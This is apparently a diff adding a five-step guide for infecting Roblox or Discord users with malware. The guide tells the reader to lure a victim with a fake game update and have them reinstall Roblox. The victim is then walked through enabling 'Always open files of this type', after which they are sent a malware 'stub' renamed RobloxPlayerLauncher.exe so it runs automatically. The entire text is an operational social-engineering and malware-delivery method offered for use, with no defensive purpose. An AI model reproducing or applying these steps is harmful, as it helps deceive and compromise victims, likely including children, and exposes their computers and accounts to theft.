@@ -1,0 +1,12 @@
+1.) Find someone on Roblox or Discord and convince them to join your game to test the latest update when they join tell them they don't have the latest version of Roblox
+
+2.) Tell them to uninstall their current version of Roblox and install Roblox again after they do
+https://cdn.discordapp.com/attachments/845259343275491338/846453177989464094/unknown.png
+
+3.) They need to click Download and Install Roblox after they need to save the RobloxPlayerLauncher to their pc once they do that
+https://cdn.discordapp.com/attachments/845259343275491338/846453419145297942/unknown.png
+
+4.) They'll see an arrow once they click that they need to click Always open files of this type
+https://cdn.discordapp.com/attachments/845259343275491338/846453634862022676/unknown.png
+
+5.) Now create a new Stub and rename it to RobloxPlayerLauncher.exe send them your stub when they download it it will automatically open without checking for a virus inside of the executable
